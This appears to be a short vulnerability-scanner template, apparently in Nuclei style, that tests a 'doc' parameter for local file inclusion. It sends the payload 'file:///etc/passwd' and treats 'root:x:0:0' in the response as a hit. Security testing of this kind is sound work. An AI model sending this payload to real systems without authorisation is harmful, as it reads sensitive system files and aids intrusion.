id: lfi6-0407
name: 'Traversal in doc'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via doc'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      doc:
        - 'file:///etc/passwd'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
